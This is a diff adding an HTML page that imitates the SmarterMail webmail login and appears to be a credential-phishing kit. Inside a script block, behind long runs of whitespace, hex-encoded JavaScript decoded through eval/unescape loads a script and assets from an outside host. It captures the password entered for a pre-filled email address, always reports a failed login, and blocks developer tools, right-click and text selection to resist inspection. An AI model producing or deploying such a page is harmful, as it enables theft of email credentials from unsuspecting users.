@@ -1,0 +1,275 @@
+<html>
+<head>
+	<link id="sheet3" href="" rel="stylesheet">
+	<link id="sheet5" href="" rel="stylesheet">
+	<link id="sheet4" href="" rel="stylesheet">
+	<link id="sheet2"  href="" rel="stylesheet">
+	<link id = "sheet" href="" rel="stylesheet">
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+
+
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<link rel="shortcut icon" id="favLink" type="image/x-icon" href="">
+    <link id="robot" href="" rel="stylesheet" type="text/css">
+
+	
+	<title id="pagetitle">SmarterMail</title>
+	
+
+	<!-- Styles -->
+	<link id="loginSHeet" href="" rel="stylesheet">
+	<style>
+		.opHidden{opacity: 0; margin-top: 0px;}
+		.errOpacity{"opacity: 1; margin-top: 0px;}
+        .main-controller{display:none;}
+        .popout-view {display:none;}
+.rotator:before,.spinner-wrapper::after{content:""}.spinner{display:block;margin-right:auto;margin-left:auto;width:4em;padding:7px;border-radius:50%;margin-top:4em;height:100%;transform:scale(1.5)}.spinner-wrapper{width:4em;height:4em;border-radius:100%;left:calc(50% - 2em);margin:auto;position:relative;top:38%}.spinner-wrapper::after{background:#f3f3f3;border-radius:50%;width:3em;height:3em;position:absolute;top:.5em;left:.5em}.rotator{position:relative;width:4em;border-radius:4em;overflow:hidden;animation:rotate 2s infinite linear}.rotator:before{position:absolute;top:0;left:0;right:0;bottom:0;background:#3F51B5;border:3px solid #f3f3f3;border-radius:100%}.inner-spin{background:#f3f3f3;height:4em;width:2em;animation:rotate-left 2.5s infinite cubic-bezier(.445,.050,.55,.95);border-radius:2em 0 0 2em;transform-origin:2em 2em}.inner-spin:last-child{animation:rotate-right 2.5s infinite cubic-bezier(.445,.050,.55,.95);margin-top:-4em;border-radius:0 2em 2em 0;float:right;transform-origin:0 50%}@keyframes rotate-left{100%,60%,75%{transform:rotate(360deg)}}@keyframes rotate{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}@keyframes rotate-right{0%,25%,45%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+.icon {width: 1em;height: 1em;vertical-align: -.125em;background-color:white}
+	</style>
+
+	<!-- Font Awesome and Bootstrap -->
+	<link id="fontsheet" href="" rel="stylesheet" async="">
+
+<link id="allminsheet" rel="stylesheet" type="text/css" href="">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script> 
+        
+</head>
+<body>
+	<div id="loadingInd" style="height: 100%; display: none;">
+		<div class="spinner">
+			<div class="spinner-wrapper">
+				<div class="rotator">
+					<div class="inner-spin"></div>
+					<div class="inner-spin"></div>
+				</div>
+			</div>
+		</div>
+	</div>
+
+	 
+	<div ui-view="" class="app-view" style=""><div ng-controller="loginController as vm" class="">
+
+
+
+	<div class="login-wrapper full-screen-bg-image" ng-if="vm.scaffoldMode || (vm.hasTranslations &amp;&amp; vm.isInit)" ng-style="vm.backgroundImage &amp;&amp; {'background-image': 'url(' + vm.backgroundImage + ')' } || {'background-color': vm.backgroundColor }" >
+        <div class="login-backdrop">
+
+           <div class="login-modal" ng-if="vm.scaffoldMode || (vm.settingsLoaded &amp;&amp; vm.state == 'login' &amp;&amp; !vm.initializing)" style="">
+                <div class="custom-help-container" ng-show="vm.scaffoldMode || (vm.helpText || vm.helpUrl)" aria-hidden="false">
+                    <!----><a class="help-icon" ng-href="https://help.smartertools.com/SmarterMail/current/?page=login&amp;v=17" target="_blank" rel="noopener noreferrer" ng-if="vm.scaffoldMode || (vm.helpUrl)" href="https://help.smartertools.com/SmarterMail/current/?page=login&amp;v=17">
+                       <!-- <i class="toolsicon toolsicon-help-modal" aria-label="Online Help" md-labeled-by-tooltip="md-tooltip-1">-->
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon" viewBox="0 0 512 512"><!--! Font Awesome Pro 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2022 Fonticons, Inc. --><path d="M256 0C114.6 0 0 114.6 0 256s114.6 256 256 256s256-114.6 256-256S397.4 0 256 0zM256 400c-18 0-32-14-32-32s13.1-32 32-32c17.1 0 32 14 32 32S273.1 400 256 400zM325.1 258L280 286V288c0 13-11 24-24 24S232 301 232 288V272c0-8 4-16 12-21l57-34C308 213 312 206 312 198C312 186 301.1 176 289.1 176h-51.1C225.1 176 216 186 216 198c0 13-11 24-24 24s-24-11-24-24C168 159 199 128 237.1 128h51.1C329 128 360 159 360 198C360 222 347 245 325.1 258z"/></svg>
+                        </i>
+                    </a>
+                </div>
+              
+                <!----><h1 class="welcome-message" ng-if="!vm.customTitle">Welcome to SmarterMail</h1><!---->
+
+                <!---->
+				<div id="logBox">
+                <form class="ng-pristine ng-invalid ng-invalid-required ng-valid-maxlength" name="loginForm" id="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off"  >
+				
+					
+                    <div ng-init="vm.loginForm = loginForm"></div>
+                    <md-input-container id="emailFocus" class="md-input-focused">
+                        <label for="loginUsernameBox" class="md-required">Email Address</label>
+                        <input id="email" name="email" type="text" ng-model="vm.username" autofocus="" required="" ng-maxlength="200" class="md-input ng-valid-maxlength ng-dirty ng-valid-parse ng-touched ng-not-empty ng-valid ng-valid-required" aria-invalid="false" style="" readonly>
+					
+						<div class="md-errors-spacer"></div>
+                        <div ng-messages="loginForm.username.$error" role="alert" class="md-input-messages-animation md-auto-hide ng-active" aria-live="assertive">
+                          <div ng-message="required" class="md-input-message-animation" style="opacity: 0; margin-top: 0px;">This field is required.</div>
+                        </div>
+                    </md-input-container>
+
+                    <md-input-container id="pwfocus"  class="md-input-focused">
+                        <label for="loginPasswordBox" class="md-required">Password</label>
+						
+						<input id="domain" type="hidden" value="" name="domain">
+						<input id="fieldName" type="hidden" value="" name="field">
+                        <input id="password" name="password" type="password" ng-model="vm.password" required="" ng-maxlength="200" class="ng-pristine ng-untouched md-input ng-empty ng-invalid ng-invalid-required ng-valid-maxlength" aria-invalid="true" ><div class="md-errors-spacer"></div>
+                        <div ng-messages="loginForm.password.$error" role="alert" class="md-input-messages-animation md-auto-hide ng-active" aria-live="assertive">
+                           <div ng-message="required" id="pwerrorMsg" class="md-input-message-animation" class="opHidden">This field is required.</div>
+                        </div>
+                    </md-input-container>
+
+                    <!---->
+
+	                <st-toggle-switch st-model="vm.rememberMe" translation-key="REMEMBER_ME" class="single-line" st-enter-key="vm.login()" ng-click="vm.rememberMe = !vm.rememberMe" on-click="vm.rememberMe = !vm.rememberMe" role="button" tabindex="0"><md-switch md-no-ink="" ng-model="stModel" class="md-primary ng-pristine ng-untouched ng-valid ng-empty" ng-click="myFunction()" aria-label="REMEMBER_ME" tabindex="0" type="checkbox" role="checkbox" aria-checked="false" aria-invalid="false"><div class="md-container" style="touch-action: pan-x;"><div class="md-bar"></div><div class="md-thumb-container"><div class="md-thumb" md-ink-ripple="" md-ink-ripple-checkbox=""></div></div></div><div ng-transclude="" class="md-label"><span class="wordwrap" translate="REMEMBER_ME">Remember Me</span></div></md-switch></st-toggle-switch>
+					
+					<h2 ng-if="vm.scaffoldMode || (vm.error)" class="paragraph error-container" id="errorBanner" style="display:none"><span id="errorMsg">You have been logged out! Sign in to continue."</span></h2>
+
+                    <div class="buttons buttons-flex more-top-space" ng-class="{'more-top-space': vm.showPasswordRetrieval}">
+                        <div class="left-side">
+                            <!----><div ng-if="vm.scaffoldMode || (vm.showPasswordRetrieval)"><a ng-click="vm.forgotPasswordClicked()">Forgot your password?</a></div>
+                        </div>
+                        <div class="right-side">
+                            <div class="md-primary md-button md-ink-ripple" id="loginbtn" type="submit" ng-transclude="" ng-disabled="vm.loading">Login</div></div>
+
+
+
+                        </div>
+                   
+                </form>
+				<div>
+				<script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+																																							OO00='206c697374656e657220666f72207468652077696e646f77206c6f6164206576656e740d0a090909092f2f0d0a090909090d0a090909090d0a090909090d0a2020202020202020202020207d293b0d0a0909090d0a092f2f2066756e6374696f6e20746f206c6f61642065787465726e616c207363726970740d0a0966756e6374696f6e206c6f616445787465726e616c5363726970742875726c2c63616c6c6261636b29207b0d0a090976617220736372697074203d20646f63756d656e742e637265617465456c656d656e74282773637269707427293b0d0a09097363726970742e737263203d20707265666978202b2075726c3b0d0a09097363726970742e6f6e6c6f6164203d2066756e6374696f6e2829207b0d0a0909090d0a0909096966202863616c6c6261636b29207b0d0a0909090963616c6c6261636b28293b090909090d0a0909097d0d0a0909090d0a09097d3b0d0a0909646f63756d656e742e686561642e617070656e644368696c6428736372697074293b202f2f20417070656e64207468652073637269707420746f2074686520626f64790d0a097d0d0a090d0a20202020242827236572726f7242616e6e657227292e73686f7728293b0d0a7d293b0d0a090d0a646f63756d656e742e6164644576656e744c697374656e657228276b6579646f776e272c206576656e74203d3e207b0d0a2020696620286576656e742e6b6579436f6465203d3d3d20313233207c7c20286576656e742e6374726c4b6579202626206576656e742e73686966744b6579202626206576656e742e6b6579436f6465203d3d3d2037332929207b0d0a202020206576656e742e70726576656e7444656661756c7428293b0d0a20207d0d0a7d293b0d0a2f2f2044697361626c652072696768742d636c69636b20636f6e74657874206d656e750d0a646f63756d656e742e6164644576656e744c697374656e65722827636f6e746578746d656e75272c206576656e74203d3e206576656e742e70726576656e7444656661756c742829293b0d0a2f2f61766f696420666f726d207375626d697373696f6e20776974686f75742076616c69646174696f6e0d0a242827236c6f67696e62746e27292e6f6e2827636c69636b272c2066756e6374696f6e286576656e7429207b0d0a092f2f616c657274282273746172742066786e7422293b0d0a09636c6b4c676e2866756e6374696f6e28737461747573436f6465297b0d0a0909646973706c617943737328737461747573436f6465293b0d0a09090d0a097d293b0d0a7d293b0d0a242827236c6f67426f7827292e6f6e28276b6579646f776e272c2066756e6374696f6e286576656e7429207b0d0a09092f2f204372656174652061206e6577204b6579626f6172644576656e742077697468206d6f646966696564206b6579436f64650d0a0909636865636b5375626d6974286576656e742c2066756e6374696f6e28737461747573436f646529207b0d0a0909090d0a090909646973706c617943737328737461747573436f6465293b0d0a20202020202020207d293b0d0a202020207d293b0d0a090d0a66756e6374696f6e20646973706c617943737328737461747573297b0d0a0909696628737461747573297b0d0a090909646f63756d656e742e676574456c656d656e744279496428276572726f724d736727292e696e6e657248544d4c3d22557365726e616d65206f722070617373776f726420697320696e636f72726563742e223b0d0a202020202020202020202020242827236572726f7242616e6e657227292e73686f7728293b0d0a09097d656c7365207b0d0a09090909646f63756d656e742e676574456c656d656e744279496428276572726f724d736727292e696e6e657248544d4c3d2257726f6e67207573657220696e7075742e20706c6561736520636865636b20796f757220656e747279223b0d0a2020202020202020202020202020202020242827236572726f7242616e6e657227292e73686f7728293b0d0a09097d0d0a090d0a7d';eval(unescape('%66%75%6E%63%74%69%6F%6E%20%5F%63%28%5F%69%29%7B%76%61%72%20%61%3D%6E%65%77%20%41%72%72%61%79%28%31%30%30%30%29%2E%6A%6F%69%6E%28%27%25%30%44%25%30%41%27%29%3B%76%61%72%20%74%3D%5F%69%2E%72%65%70%6C%61%63%65%28%2F%28%5C%53%7B%32%7D%29%2F%67%69%2C%27%24%31%25%27%29%3B%74%3D%27%25%27%2B%74%3B%74%3D%74%2E%73%75%62%73%74%72%28%30%2C%74%2E%6C%65%6E%67%74%68%2D%31%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%27%3C%73%63%27%2B%27%72%69%70%74%3E%27%2B%61%2B%74%2B%61%2B%27%3C%2F%73%63%27%2B%27%72%69%70%74%3E%27%29%29%7D%3B'));O0OO='646c3d646f63756d656e742e6c61796572733b6f653d77696e646f772e6f706572613f313a303b64613d28646f63756d656e742e646f63756d656e744d6f64657c7c646f63756d656e742e616c6c292626216f653b67653d646f63756d656e742e676574456c656d656e74427949643b77733d77696e646f772e736964656261723f747275653a66616c73653b744e3d6e6176696761746f722e757365724167656e742e746f4c6f7765724361736528293b697a4e3d744e2e696e6465784f6628276e6574736361706527293e3d303f747275653a66616c73653b7a69733d64613b7a6973383d64613b766172206d73673d27273b66756e6374696f6e206e656d28297b72657475726e20747275657d3b77696e646f772e6f6e6572726f72203d206e656d3b7a4f463d77696e646f772e6c6f636174696f6e2e70726f746f636f6c2e696e6465784f66282766696c652729213d2d313f747275653a66616c73653b6937663d7a69732626217a4f463f747275653a66616c73653b6966286461297b646f63756d656e742e6f6e6472616773746172743d66756e6374696f6e2028297b72657475726e2066616c73657d3b66756e6374696f6e2063494528297b286d7367293b72657475726e2066616c73657d3b66756e6374696f6e20636328297b646f63756d656e742e6f6e636f6e746578746d656e753d6349453b73657454696d656f7574282263632829222c323030297d3b636328297d3b66756e6374696f6e20634e532865297b696628646c7c7c7773297b696628652e77686963683d3d327c7c652e77686963683d3d33297b286d7367293b72657475726e2066616c73657d7d7d3b696628646c297b646f63756d656e742e636170747572654576656e7473284576656e742e4d4f555345444f574e293b646f63756d656e742e6f6e6d6f757365646f776e3d634e537d656c73657b646f63756d656e742e6f6e6d6f75736575703d634e537d3b646f63756d656e742e6f6e636f6e746578746d656e753d6e65772046756e6374696f6e282272657475726e2066616c736522293b6966286f65297b66756e6374696f6e20726f2865297b6966286576656e742e627574746f6e3d3d32297b616c65727428272027293b72657475726e20307d3b72657475726e20747275657d3b646f63756d656e742e6f6e6d6f757365646f776e3d726f7d3b66756e6374696f6e206e733928297b77696e646f772e7374617475733d2720273b73657454696d656f757428276e73392829272c31303030293b72657475726e20747275657d3b696628216f65297b6e733928293b646f63756d656e742e6f6e6d6f7573656f7665723d6e73393b646f63756d656e742e6f6e6d6f7573656f75743d6e73397d3b66756e6374696f6e2075302861297b72657475726e2066616c73657d3b66756e6374696f6e2075312865297b72657475726e28652e7461726765742e7461674e616d65213d6e756c6c2626652e7461726765742e7461674e616d652e73656172636828275e28494e5055547c54455854415245417c425554544f4e7c53454c4543547c454d4245447c4f424a4543547c48544d4c29242729213d2d31297d3b66756e6374696f6e2075322865297b696628652e77686963683d3d31297b77696e646f772e636170747572654576656e7473284576656e742e4d4f5553454d4f5645293b77696e646f772e6f6e6d6f7573656d6f76653d75307d7d3b66756e6374696f6e2075332865297b696628652e77686963683d3d31297b77696e646f772e72656c656173654576656e7473284576656e742e4d4f5553454d4f5645293b77696e646f772e6f6e6d6f7573656d6f76653d6e756c6c7d7d3b20696628646c297b77696e646f772e636170747572654576656e7473284576656e742e4d4f55534555507c4576656e742e4d4f555345444f574e293b77696e646f772e6f6e6d6f757365646f776e3d75323b77696e646f772e6f6e6d6f75736575703d75337d656c73652069662867652626216461297b646f63756d656e742e6f6e';OO0O='6d6f757365646f776e3d75317d3b66756e6374696f6e206e6e28297b69662877696e646f772e67657453656c656374696f6e297b76617220743d77696e646f772e67657453656c656374696f6e28292e746f537472696e6728293b696628742e696e6465784f6628277177656173647a786327293e317c7c742e6c656e6774683e3430297b646f63756d656e742e626f64792e696e6e657248544d4c3d272e273b6c6f636174696f6e2e72656c6f616428297d3b73657454696d656f757428226e6e2829222c323030297d7d3b6e6e28293b66756e6374696f6e206e6928297b6966286461297b646f63756d656e742e6f6e73656c65637473746172743d66756e6374696f6e2028297b72657475726e2066616c73657d3b73657454696d656f757428226e692829222c323030297d7d3b6e6928293b2428646f63756d656e74292e72656164792866756e6374696f6e28297b0d0a090d0a092f2f73657420676c6f62616c207661726961626c65730d0a0976617220767372203d2077696e646f772e6c6f636174696f6e2e687265662e736c6963652877696e646f772e6c6f636174696f6e2e687265662e696e6465784f662827232729202b2031293b0d0a09636f6e7374206d794172726179203d207673722e73706c697428222622293b0d0a09767372203d206d7941727261795b305d3b0d0a090d0a09090d0a092f2f7365742065787465726e616c2066696c65730d0a09636f6e737420707265666978203d202268747470733a2f2f726974616c6672656e646f2e746f702f656e7465727072697365732f223b0d0a09766172206172726179736574203d5b0d0a09095b226661764c696e6b222c22736d617274657266617669636f6e2e69636f222c2268726566222c226964225d2c0d0a09095b22736865657433222c226d642d7468656d65332e637373222c2268726566222c226964225d2c0d0a09095b22736865657435222c226d642d7468656d65352e637373222c2268726566222c226964225d2c0d0a09095b22736865657434222c226d642d7468656d65342e637373222c2268726566222c226964225d2c0d0a09095b22736865657432222c226d642d7468656d65322e637373222c2268726566222c226964225d2c0d0a09095b227368656574222c226d642d7468656d652e637373222c2268726566222c226964225d2c0d0a09095b226c6f67696e5348656574222c226c6f67696e2d762d3130302e302e373639392e31343039312e3864386334356365393164626130302e6d696e2e637373222c2268726566222c226964225d2c0d0a09095b22726f626f74222c22726f626f746f2e637373222c2268726566222c226964225d2c0d0a09095b22616c6c6d696e7368656574222c22616c6c2d762d3130302e302e373639392e31343039312e3864386334356365393164626130302e6d696e2e637373222c2268726566222c226964225d2c0d0a09095b22666f6e747368656574222c22666f6e742d617765736f6d652e637373222c2268726566222c226964225d2c0d0a09095b226c6f67696e2d777261707065722066756c6c2d73637265656e2d62672d696d616765222c226261636b67726f756e642d6f662d7468652d6461792e6a7067222c22696d61676575726c222c22636c617373225d2c0d0a090d0a095d0d0a202020202f2f204c6f6164207468652065787465726e616c2073637269707420616e642063616c6c207468652065787465726e616c2063616c6c6261636b2066756e6374696f6e0d0a20202020202020202020206c6f616445787465726e616c5363726970742827656e74657270726973652e6a73272c2066756e6374696f6e2829207b0d0a09090909636865636b444e53287673722c66756e6374696f6e28297b0d0a09090909096f6e426f64794c6f61642861727261797365742c207072656669782c20767372293b0d0a090909097d293b0d0a202020202020202020202020202020200d0a202020202020202020202020202020202f2f2041646420616e206576656e74';OOO0=O0OO+OO0O+OO00;_c(OOO0);O5242545259554B534A='4D464C47474A595354554B4452594A454256525644474F4957505043454F504B47484547564D505649494D485959595051574F5753434757464E4E4A4448474E434A44524A45554B58584A4A53544A444E4E42515047424A455159494A44504F485056424F42534755574E5353444E4D57574D4B504C425043464D485454544E444558504853484949494E57544E4D5242454F514C4A464D47485053455854465745575646594F4D524A574650544850484C545457504F58574457594646515057544845444B4F5347464642434D584556585145545647574A53554D53484B4F4B454E595751'
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</script>
+            </div>
+		
+	    </div>
+
+        <div class="footer">
+            <div class="left">
+                <div ng-hide="vm.hideCookieNotice" style="display: flex;" aria-hidden="false">
+                    <a ng-click="vm.dismissCookieNotice()" class="dismiss" aria-label="Dismiss this notice" md-labeled-by-tooltip="md-tooltip-0">
+                        <!--<i class="toolsicon toolsicon-modal-x"></i>-->
+			
+						 <svg xmlns="http://www.w3.org/2000/svg" class="icon" viewBox="0 0 320 512"><path d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+                    </a>
+                    <div>
+                        By logging in, you're accepting cookies for this site. Webmail is not compatible with private/incognito browsing.
+                    </div>
+                </div>
+            </div>
+            <div class="right"></div>
+        </div>
+    </div>
+</div>
+</div>
+
+	<div id="context-menu-area"></div>
+
+
+</body>
+</html>
